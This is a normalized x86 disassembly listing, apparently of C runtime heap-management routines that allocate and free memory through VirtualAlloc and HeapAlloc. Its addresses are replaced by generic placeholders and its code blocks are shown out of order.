mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_42ea90
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_43340f
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_4337c9
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_433718
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_433718
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_4337c9
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_4338c4
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_433bba
cmp [ rw-data ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne r-xdata
push 0x2020
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi rw-data
jmp r-xdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push __dos_header
push 0x0
call ebp
mov edi eax
test edi edi
je r-xdata
cmp esi rw-data
je r-xdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rw-data
cmp esi eax
jne r-xdata
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov [ rw-data ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl r-xdata
push ebx
push 0x0
push edi
call sub_42dc30
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov eax esi
jmp r-xdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp r-xdata
lea eax [ edi + __dos_header ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae r-xdata
sub_433cfe
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rw-data ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
or [ rw-data ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rw-data ]
call [ HeapFree@IAT ]
pop esi
retn
sub_433d54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
cmp esi [ rw-data ]
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge r-xdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0xffffffff
je r-xdata
cmp [ edi ] 0xf0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je r-xdata
or [ edi ] 0xffffffff
dec [ rw-data ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ecx + 0x18 ] 0xffffffff
jne r-xdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe r-xdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je r-xdata
cmp edx 0x400
jne r-xdata
inc edx
add eax 0x8
cmp edx 0x400
jl r-xdata
push ecx
call sub_433cfe
pop ecx
cmp [ eax ] 0xffffffff
jne r-xdata
sub_433e16
mov eax [ esp + 0x4 ]
mov edx rw-data
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je r-xdata
cmp eax [ ecx + 0x14 ]
jb r-xdata
xor eax eax
pop esi
retn
jmp r-xdata
test al 0xf
jne r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb r-xdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_433e6d
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne r-xdata
retn
inc [ rw-data ]
cmp [ rw-data ] 0x20
jne r-xdata
push 0x10
call sub_433d54
pop ecx
sub_433eb2
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae r-xdata
mov eax rw-data
mov edi eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl r-xdata
mov edi [ edi ]
cmp edi eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je r-xdata
mov esi [ esi ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ edi ]
cmp eax ebx
jl r-xdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
call sub_433bba
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne r-xdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
jmp r-xdata
push ebx
push ecx
push eax
call sub_4340ba
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rw-data ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp r-xdata
cmp [ edi + 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
jmp r-xdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_4340ba
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae r-xdata
mov [ rw-data ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_42dc30
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle r-xdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov [ edi + 0x4 ] ebx
mov [ rw-data ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne r-xdata
cmp ecx eax
add ecx 0x8
jmp r-xdata
cmp ecx eax
jae r-xdata
sub_4340ba
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
